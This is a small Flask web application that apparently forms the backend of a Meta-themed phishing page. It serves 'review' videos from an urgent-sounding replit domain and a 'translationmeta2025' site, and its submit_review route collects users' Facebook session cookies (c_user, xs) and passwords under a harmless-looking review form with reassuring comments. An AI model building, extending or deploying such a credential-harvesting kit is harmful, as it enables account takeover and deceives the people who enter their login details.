from flask import Flask, render_template, request, jsonify

app = Flask(__name__)

# Video files mapping
VIDEO_FILES = {
    'english': 'https://request-for-immediate-action.replit.app/attached_assets/video-information.mp4',
    'filipino': 'https://translationmeta2025-f87fc.web.app/filipino.mp4',
    'hindi': 'https://translationmeta2025-f87fc.web.app/hindi.mp4',
    'portuguese': 'https://translationmeta2025-f87fc.web.app/portuguese.mp4',
    'spanish': 'https://translationmeta2025-f87fc.web.app/spanish.mp4',
    'tamil': 'https://translationmeta2025-f87fc.web.app/Tamil.mp4',
    'arabic': 'https://translationmeta2025-f87fc.web.app/Arabic.mp4',
    'french': 'https://translationmeta2025-f87fc.web.app/French.mp4',
    'swedish': 'https://translationmeta2025-f87fc.web.app/Swedish.mp4',
    'japanese': 'https://translationmeta2025-f87fc.web.app/japanese.mp4'
}

# Languages data
LANGUAGES = [
    {'code': 'english', 'name': 'English', 'native': 'English'},
    {'code': 'spanish', 'name': 'Spanish', 'native': 'Español'},
    {'code': 'french', 'name': 'French', 'native': 'Français'},
    {'code': 'german', 'name': 'German', 'native': 'Deutsch'},
    {'code': 'italian', 'name': 'Italian', 'native': 'Italiano'},
    {'code': 'portuguese', 'name': 'Portuguese', 'native': 'Português'},
    {'code': 'russian', 'name': 'Russian', 'native': 'Русский'},
    {'code': 'japanese', 'name': 'Japanese', 'native': '日本語'},
    {'code': 'chinese', 'name': 'Chinese', 'native': '中文'},
    {'code': 'arabic', 'name': 'Arabic', 'native': 'العربية'},
    {'code': 'hindi', 'name': 'Hindi', 'native': 'हिन्दी'},
    {'code': 'bengali', 'name': 'Bengali', 'native': 'বাংলা'},
    {'code': 'filipino', 'name': 'Filipino', 'native': 'Filipino'},
    {'code': 'tamil', 'name': 'Tamil', 'native': 'தமிழ்'},
    {'code': 'swedish', 'name': 'Swedish', 'native': 'Svenska'}
]

@app.route('/')
def index():
    return render_template('index.html', languages=LANGUAGES, video_files=VIDEO_FILES)

@app.route('/submit_review', methods=['POST'])
def submit_review():
    data = request.json
    
    # Here you would typically process the data (c_user, xs, password)
    # For demonstration, we'll just print it and return a success response
    print("Received form data:", data)
    
    # In a real application, you would:
    # 1. Validate the data
    # 2. Store it securely
    # 3. Process it as needed
    
    return jsonify({'status': 'success', 'message': 'Review submitted successfully'})

@app.route('/search_languages', methods=['GET'])
def search_languages():
    query = request.args.get('query', '').lower()
    
    if not query:
        return jsonify(LANGUAGES)
    
    filtered = [
        lang for lang in LANGUAGES 
        if query in lang['name'].lower() or query in lang['native'].lower()
    ]
    
    return jsonify(filtered)

if __name__ == '__main__':
    app.run(debug=True)
